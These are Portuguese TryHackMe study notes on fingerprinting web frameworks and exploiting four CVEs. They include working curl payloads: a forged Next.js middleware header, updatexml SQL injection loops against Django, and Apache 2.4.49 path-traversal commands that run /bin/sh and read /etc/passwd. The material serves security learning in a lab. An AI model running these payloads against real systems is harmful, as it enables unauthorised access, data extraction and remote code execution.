# 🕵️ Resumão: Stack Fingerprinting & CVEs por Framework

> Anotações de estudo (TryHackMe) para o repositório de Cybersecurity.
>
> ⚠️ **Use apenas em laboratórios (TryHackMe, HackTheBox, VMs próprias) ou em sistemas para os quais você tenha autorização por escrito.**

---

## 📑 Índice

1. [Ideia central da sala](#1-ideia-central-da-sala)
2. [MERN / Express — CVE-2020-8203](#2-mern--express--cve-2020-8203)
3. [Next.js Middleware — CVE-2025-29927](#3-nextjs-middleware--cve-2025-29927)
4. [Django ORM — CVE-2021-35042](#4-django-orm--cve-2021-35042)
5. [Apache LAMP — CVE-2021-41773](#5-apache-lamp--cve-2021-41773)
6. [Automação com Nikto](#6-automação-com-nikto)
7. [Tabela-resumo dos 4 CVEs](#7-tabela-resumo-dos-4-cves)
8. [O workflow de 3 passos](#8-o-workflow-de-3-passos)
9. [Checklist de fingerprinting rápido](#9-checklist-de-fingerprinting-rápido)
10. [Erros comuns](#10-erros-comuns)

---

## 1. Ideia central da sala

> **Toda stack vaza sua identidade.** Headers HTTP, nomes de cookies, páginas de erro e comportamento de rotas específicas identificam o framework por trás de uma aplicação — geralmente antes mesmo de mandar um payload. Depois de identificar a stack (e a versão exata), o ataque para de ser "tentativa e erro" e passa a ser dirigido por evidência.

Fluxo repetido em toda a sala: **ler os sinais → confirmar a versão → executar a cadeia de exploração.**

---

## 2. MERN / Express — CVE-2020-8203

**Impacto:** Prototype pollution → bypass de autenticação · **CVSS 7.4 (High)**

### Fingerprint

| Sinal | Valor | Confiança |
|---|---|---|
| Header | `x-powered-by: Express` | Alta |
| Cookie de sessão | `connect.sid` | Alta |
| `Server` banner | Ausente (Express não manda por padrão) | — |

### A falha

Prototype pollution ocorre quando um atacante consegue injetar propriedades no `Object.prototype` do JavaScript (geralmente via merge/extend de objetos vindos de input do usuário, ex: `lodash.merge`, `_.defaultsDeep`, parsing de query strings aninhadas). Como **todo objeto em JS herda do `Object.prototype`**, poluir ele afeta literalmente qualquer lugar do código que faça checagens baseadas em propriedades (ex: `isAdmin`, `role`), permitindo contornar lógica de autenticação/autorização sem nunca ter uma sessão válida.

### Achado extra do Nikto

Cookie `connect.sid` criado **sem a flag `httponly`** — abre a porta pra roubo de sessão via XSS (ver resumão de DevTools, seção de cookies).

---

## 3. Next.js Middleware — CVE-2025-29927

**Impacto:** Um único header → bypass completo do middleware · **CVSS 9.1 (Critical)**

### Fingerprint

| Sinal | Valor | Confiança |
|---|---|---|
| Header | `x-powered-by: Next.js` | Alta |
| Headers | `x-nextjs-cache`, `x-nextjs-stale-time`, `x-nextjs-prerender` | Alta — confirmam App Router em modo produção |
| JS inline | `self.__next_f.push(...)` / `window.__next_f` | Confirma App Router (RSC) |

### A falha

O Next.js usa internamente o header `x-middleware-subrequest` pra evitar que o middleware entre em loop infinito quando ele mesmo dispara uma subrequisição. O bug: o servidor **confia ciegamente** no valor desse header, sem checar se veio de dentro do próprio servidor ou de um cliente externo.

### Exploração

```bash
# Sem o header → protegido, redireciona pro login
curl -v http://<IP>:3001/dashboard
# → 307 Temporary Redirect → /login

# Com o header forjado → bypass total do middleware
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://<IP>:3001/dashboard
# → 200 OK, conteúdo protegido liberado (inclusive a flag)
```

O valor do header é só o padrão interno repetido (`middleware:middleware:...`) — o servidor acredita que o middleware já rodou e pula a checagem de sessão.

---

## 4. Django ORM — CVE-2021-35042

**Impacto:** SQL injection via `order_by()` não parametrizado · **CVSS 9.8 (Critical)**, sem autenticação

### Fingerprint

| Sinal | Valor | Confiança |
|---|---|---|
| `Server` header | `WSGIServer/0.2 CPython/X.X.X` | Alta |
| Cookie | `csrftoken` | Alta |
| Headers | `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin` juntos | Alta — `SecurityMiddleware` do Django |
| HTML de formulário POST | campo oculto `csrfmiddlewaretoken` | **Altíssima** — exclusivo do Django |

### A falha

```python
order = self.request.GET.get('order', 'name')
sql = f'... ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)'
```

O parâmetro `?order=` da URL é concatenado direto na SQL, sem usar o ORM corretamente (que escaparia automaticamente). O `CASE WHEN (1=1)` garante que o branch injetado sempre executa.

### A técnica `updatexml()`

`updatexml(1, xpath_expr, 1)` gera erro quando o XPath é inválido. Colocando um `SELECT` dentro do XPath (com `concat(0x7e, ...)` como marcador `~`), o **erro devolvido inclui o resultado da subconsulta** — e como `DEBUG = True`, o Django mostra esse erro completo na resposta 500.

⚠️ `updatexml()` só funciona com `DEBUG = True`. Em produção (`DEBUG = False`), usar blind injection com `SLEEP()`.
⚠️ O resultado é truncado em **32 caracteres** — pra listas longas, prefira extrair um item por vez com `LIMIT i,1` em vez de `group_concat()`.

### Comandos usados

```bash
# Versão do banco
curl -s "http://<IP>:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'

# Nome do banco atual
curl -s "http://<IP>:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'

# Contar tabelas
curl -s "http://<IP>:8000/products/?order=updatexml(1,concat(0x7e,(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database())),1)" | grep -o '~[^&<]*'

# Enumerar tabelas uma por vez (evita o corte de 32 chars)
for i in $(seq 0 N); do
  curl -s "http://<IP>:8000/products/?order=updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20$i,1)),1)" | grep -o '~[^&<]*'
done
```

**Banco encontrado no lab:** `vuln_db`

---

## 5. Apache LAMP — CVE-2021-41773

**Impacto:** Path traversal + RCE via `mod_cgi` · **CVSS 9.8 (Critical)**

### Fingerprint

| Sinal | Valor | Confiança |
|---|---|---|
| `Server` header | `Apache/2.4.49 (Unix)` | **Altíssima** — mapeia direto pra essa CVE |
| Rodapé de página 404 | Repete a versão do Apache | Alta |
| `/cgi-bin/` | `403 Forbidden` (não `404`) | Alta — confirma que `mod_cgi` está ativo |

### A falha

Bug introduzido na função `ap_normalize_path()` do Apache 2.4.49: o filtro anti-traversal roda **antes** da decodificação completa da URL. Enviando `.%2e/` (ponto literal + ponto codificado + barra), o filtro não reconhece como `../`, mas o sistema de arquivos **decodifica depois** e interpreta como travessia de diretório de verdade.

Combinado com `/cgi-bin/` (que tem execução CGI habilitada), a travessia até um binário como `/bin/sh` faz o Apache **executar** esse binário como script CGI, passando o corpo do POST como `stdin` — ou seja, RCE completo.

### Por que `--path-as-is` é obrigatório

O `curl` normaliza URLs antes de enviar — sem essa flag, ele "corrige" o `.%2e/` antes de sair da sua máquina, e o servidor nunca recebe os pontos codificados.

### Comandos usados

```bash
# Confirmar RCE
curl -s --path-as-is "http://<IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'
# → uid=1(daemon) gid=1(daemon) groups=1(daemon)

# Ler /etc/passwd
curl -s --path-as-is "http://<IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'

# Ler a flag
curl -s --path-as-is "http://<IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
```

A parte `echo Content-Type: text/plain; echo;` é obrigatória: toda resposta CGI precisa simular um cabeçalho HTTP válido + linha vazia, senão o Apache devolve `500`.

📌 **Nota de versionamento:** só afeta Apache **2.4.49**. Um patch parcial na 2.4.50 bloqueou a codificação simples, mas não a dupla (`%%32%65%%32%65/`, rastreada como CVE-2021-42013). A partir da 2.4.51 está totalmente corrigido.

---

## 6. Automação com Nikto

`nikto -h http://<IP>:<porta>` resume em segundos o que levaria várias requisições manuais pra confirmar — mas **não substitui** a investigação manual de falhas de lógica de aplicação (SQLi, bypass de middleware). Ele identifica a stack; a exploração de falhas específicas ainda depende de olhar o comportamento manualmente.

Achados extras relevantes que o Nikto trouxe no Apache:
- **ETags vazando inodes** — o campo `ETag` pode conter, codificado, o número de inode do arquivo no disco (vazamento de info interna do sistema de arquivos)
- **Método `TRACE` ativo → XST (Cross-Site Tracing)** — o servidor ecoa de volta a requisição completa; combinado com XSS, permite ler cookies `HttpOnly` que o JS normalmente não conseguiria acessar

---

## 7. Tabela-resumo dos 4 CVEs

| Stack | CVE | Impacto | CVSS |
|---|---|---|---|
| MERN / Express | CVE-2020-8203 | Prototype pollution → bypass de autenticação | 7.4 High |
| Next.js Middleware | CVE-2025-29927 | Um header → bypass completo do middleware | 9.1 Critical |
| Django ORM | CVE-2021-35042 | SQL injection via `ORDER BY` não parametrizado | 9.8 Critical |
| Apache LAMP | CVE-2021-41773 | Path traversal + RCE via `mod_cgi` | 9.8 Critical |

---

## 8. O workflow de 3 passos

```text
1) LER OS SINAIS
   → headers HTTP, nomes de cookies, rodapés de erro, comportamento de rotas

2) CONFIRMAR A VERSÃO/CONFIGURAÇÃO
   → "é exatamente Apache 2.4.49", "é Next.js com App Router em produção"
   → cada CVE é amarrado a uma versão/config específica, nunca ao framework "em geral"

3) EXECUTAR A CADEIA
   → só depois de confirmar o alvo certo, usar o payload certo
```

---

## 9. Checklist de fingerprinting rápido

```text
1) curl -I <url>                          → Server, X-Powered-By, cookies, CSP
2) curl -v <url>/caminho-inexistente       → rodapé de erro pode vazar versão
3) Ver HTML de qualquer form POST          → csrfmiddlewaretoken = Django
4) Testar pastas sensíveis (/cgi-bin/)     → 403 (existe, sem listagem) vs 404 (não existe)
5) nikto -h <url>                          → varredura rápida de todas as portas/serviços
6) Cruzar a versão exata com CVEs conhecidas antes de qualquer payload
```

---

## 10. Erros comuns

- ❌ Lançar um exploit antes de confirmar a versão exata do serviço.
- ❌ Esquecer `--path-as-is` no curl ao explorar path traversal — o curl "corrige" a URL sozinho.
- ❌ Usar `updatexml()` em produção sem checar se `DEBUG=True` primeiro.
- ❌ Tentar `group_concat()` pra listas longas sem saber do limite de 32 caracteres do `updatexml()`.
- ❌ Confiar em headers internos (tipo `x-middleware-subrequest`) só porque "normalmente só o servidor manda isso" — se o servidor não valida a origem, o cliente pode forjar.
- ❌ Parar no Nikto achando que cobre falhas de lógica de aplicação — ele identifica a stack, não SQLi ou bypass de auth específicos.

---

## 📚 Referências

- [TryHackMe – Stack Fingerprinting / CVE Rooms](https://tryhackme.com/)
- [NVD – CVE-2020-8203](https://nvd.nist.gov/vuln/detail/CVE-2020-8203)
- [NVD – CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
- [NVD – CVE-2021-35042](https://nvd.nist.gov/vuln/detail/CVE-2021-35042)
- [NVD – CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
- [NVD – CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)
